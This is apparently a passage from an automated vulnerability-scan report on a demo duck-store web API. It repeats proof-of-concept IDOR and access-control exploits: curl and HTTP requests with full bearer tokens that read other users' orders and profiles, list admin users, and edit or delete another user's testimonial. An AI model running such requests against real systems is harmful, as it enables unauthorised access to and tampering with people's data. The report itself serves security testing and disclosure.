4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/products/2 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → pii_read
  - session — https://duck-store.escape.tech/api/v1/users/ · PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → pii_read
